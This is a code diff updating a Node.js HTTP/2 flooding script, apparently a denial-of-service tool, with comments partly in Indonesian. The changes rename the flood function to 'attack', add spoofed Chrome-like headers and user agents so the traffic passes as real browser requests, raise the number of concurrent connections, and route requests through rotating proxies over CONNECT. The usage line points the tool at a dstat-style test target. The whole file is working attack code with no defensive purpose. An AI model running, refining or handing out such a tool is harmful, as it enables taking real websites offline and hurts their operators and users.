@@ -9,8 +9,8 @@ const fs = require("fs");
 process.setMaxListeners(0);
 
 if (process.argv.length < 5) {
-    console.log(`Usage: node raw.js <url> <time> <rate> <threads>`);
-    console.log(`Proxy: proxy.txt (format ip:port)`);
+    console.log(`Usage: node cf.js <url> <time> <rate> <threads>`);
+    console.log(`Example: node cf.js https://c3.dstatbot.win/Sk87LhCJ 180 16 8`);
     process.exit();
 }
 
@@ -22,7 +22,7 @@ const args = {
 }
 
 const parsed = url.parse(args.target);
-const path = parsed.path;  // Langsung ambil path dari URL, contoh: /bWJoQa78
+const path = parsed.path;
 
 // Load proxies
 let proxies = [];
@@ -36,8 +36,8 @@ try {
     console.log("No proxy.txt found, using direct connection");
 }
 
-// Cipher TLS
-const ciphersTLS12 = [
+// TLS Cipher - match dengan browser modern
+const ciphers = [
     "TLS_AES_256_GCM_SHA384",
     "TLS_AES_128_GCM_SHA256",
     "TLS_CHACHA20_POLY1305_SHA256",
@@ -49,98 +49,108 @@ const ciphersTLS12 = [
     "ECDHE-RSA-CHACHA20-POLY1305"
 ].join(":");
 
-const ecdhCurve = "x25519:secp256r1:secp384r1";
-
-const secureOptions = 
- crypto.constants.SSL_OP_NO_SSLv2 |
- crypto.constants.SSL_OP_NO_SSLv3 |
- crypto.constants.SSL_OP_NO_TLSv1 |
- crypto.constants.SSL_OP_NO_TLSv1_1;
-
 const secureContext = tls.createSecureContext({
-    ciphers: ciphersTLS12,
+    ciphers: ciphers,
     honorCipherOrder: true,
-    secureOptions: secureOptions,
     minVersion: "TLSv1.2",
     maxVersion: "TLSv1.3"
 });
 
-// User agents
+// Realistic User Agents
 const uas = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 ];
 
+// Stats
 let stats = { total: 0, ok: 0, bad: 0, active: 0 };
 
 if (cluster.isMaster) {
-    console.log(`Target: ${args.target}`);
-    console.log(`Path: ${path}`);
-    console.log(`Time: ${args.time}s | Rate: ${args.rate}/s | Threads: ${args.threads}`);
-    console.log(`Proxy mode: ${proxies.length > 0 ? "ON" : "OFF"}`);
+    console.log(`🎯 Target: ${args.target}`);
+    console.log(`🔗 Path: ${path}`);
+    console.log(`⏱️ Time: ${args.time}s | Rate: ${args.rate}/s | Threads: ${args.threads}`);
+    console.log(`🌐 Proxy: ${proxies.length > 0 ? `${proxies.length} proxies` : "Direct"}`);
     console.log(`====================================`);
     
     for (let i = 0; i < args.threads; i++) cluster.fork();
     
     setInterval(() => {
-        console.log(`[${new Date().toLocaleTimeString()}] Total: ${stats.total} | OK: ${stats.ok} | Bad: ${stats.bad} | Active: ${stats.active}`);
-    }, 5000);
+        const successRate = stats.total > 0 ? ((stats.ok/stats.total)*100).toFixed(2) : 0;
+        console.log(`[${new Date().toLocaleTimeString()}] Total: ${stats.total} | ✅ ${stats.ok} (${successRate}%) | ❌ ${stats.bad} | 🔗 ${stats.active}`);
+    }, 3000);
     
     setTimeout(() => {
-        console.log(`\nDone - Total: ${stats.total} | OK: ${stats.ok} | Success: ${((stats.ok/stats.total)*100 || 0).toFixed(2)}%`);
+        const successRate = stats.total > 0 ? ((stats.ok/stats.total)*100).toFixed(2) : 0;
+        console.log(`\n✅ Finished!`);
+        console.log(`📊 Total: ${stats.total} | Success: ${stats.ok} (${successRate}%) | Failed: ${stats.bad}`);
         process.exit();
     }, args.time * 1000);
 } else {
+    // Random start delay biar ga serempak
     setTimeout(() => {
         setInterval(() => {
-            if (stats.active < 2000) flood();
-        }, Math.floor(1000 / args.rate));
+            if (stats.active < 3000) attack();
+        }, Math.max(10, Math.floor(1000 / args.rate)));
     }, Math.random() * 1000);
 }
 
 function getProxy() {
     if (proxies.length === 0) return null;
-    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
-    return { host: proxy[0], port: parseInt(proxy[1]) };
+    const p = proxies[Math.floor(Math.random() * proxies.length)].split(":");
+    return { host: p[0], port: parseInt(p[1]) };
 }
 
-function flood() {
+function attack() {
     stats.active++;
     
     const proxy = getProxy();
     
-    const makeConnection = (socket = null) => {
+    const doRequest = (socket = null) => {
         const tlsOpts = {
             host: parsed.host,
             port: 443,
             ALPNProtocols: ["h2", "http/1.1"],
-            ciphers: ciphersTLS12,
-            ecdhCurve: ecdhCurve,
+            ciphers: ciphers,
             honorCipherOrder: true,
             secureContext: secureContext,
             rejectUnauthorized: false,
-            servername: parsed.host,
-            minVersion: "TLSv1.2",
-            maxVersion: "TLSv1.3"
+            servername: parsed.host
         };
         
         if (socket) tlsOpts.socket = socket;
         
-        const sock = tls.connect(tlsOpts, () => {
-            const session = http2.connect(`https://${parsed.host}`, {
-                createConnection: () => sock
+        const conn = tls.connect(tlsOpts, () => {
+            const client = http2.connect(`https://${parsed.host}`, {
+                createConnection: () => conn
             });
             
-            const timer = setInterval(() => {
-                const req = session.request({
+            let reqCount = 0;
+            const maxReqs = args.rate * 10; // Max request per connection
+            
+            const interval = setInterval(() => {
+                if (reqCount++ >= maxReqs) {
+                    clearInterval(interval);
+                    client.destroy();
+                    if (socket) socket.destroy();
+                    if (stats.active > 0) stats.active--;
+                    return;
+                }
+                
+                const req = client.request({
                     ":method": "GET",
-                    ":path": path,  // Langsung pakai path dari URL, contoh: /bWJoQa78
+                    ":path": path,
                     ":scheme": "https",
                     ":authority": parsed.host,
                     "user-agent": uas[Math.floor(Math.random() * uas.length)],
-                    "accept": "*/*",
-                    "cache-control": "no-cache"
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "accept-language": "en-US,en;q=0.9",
+                    "accept-encoding": "gzip, deflate, br",
+                    "cache-control": "no-cache",
+                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Windows"',
+                    "upgrade-insecure-requests": "1"
                 });
                 
                 req.on("response", (headers) => {
@@ -158,60 +168,51 @@ function flood() {
                 req.end();
             }, Math.floor(1000 / args.rate));
             
+            // Auto close after time
             setTimeout(() => {
-                clearInterval(timer);
-                session.destroy();
+                clearInterval(interval);
+                client.destroy();
                 if (socket) socket.destroy();
                 if (stats.active > 0) stats.active--;
             }, args.time * 1000);
         });
         
-        sock.on("error", () => {
+        conn.on("error", () => {
             if (stats.active > 0) stats.active--;
             if (socket) socket.destroy();
         });
-        
-        return sock;
     };
     
-    // Kalo pake proxy
     if (proxy) {
-        const proxySock = net.connect({
-            host: proxy.host,
-            port: proxy.port,
-            allowHalfOpen: true
+        const proxyConn = net.connect({ host: proxy.host, port: proxy.port });
+        
+        proxyConn.setTimeout(10000);
+        
+        proxyConn.on("connect", () => {
+            proxyConn.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n\r\n`);
         });
         
-        proxySock.setTimeout(10000);
-        
-        proxySock.on("connect", () => {
-            const connectMsg = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n\r\n`;
-            proxySock.write(connectMsg);
-        });
-        
-        proxySock.on("data", (data) => {
-            const resp = data.toString();
-            if (resp.includes("200") || resp.includes("Connection established")) {
-                proxySock.removeAllListeners("data");
-                makeConnection(proxySock);
+        proxyConn.on("data", (data) => {
+            if (data.toString().includes("200") || data.toString().includes("Connection established")) {
+                proxyConn.removeAllListeners("data");
+                doRequest(proxyConn);
             } else {
-                proxySock.destroy();
+                proxyConn.destroy();
                 if (stats.active > 0) stats.active--;
             }
         });
         
-        proxySock.on("error", () => {
+        proxyConn.on("error", () => {
             if (stats.active > 0) stats.active--;
         });
         
-        proxySock.on("timeout", () => {
-            proxySock.destroy();
+        proxyConn.on("timeout", () => {
+            proxyConn.destroy();
             if (stats.active > 0) stats.active--;
         });
     } else {
-        makeConnection(null);
+        doRequest(null);
     }
 }
 
 process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
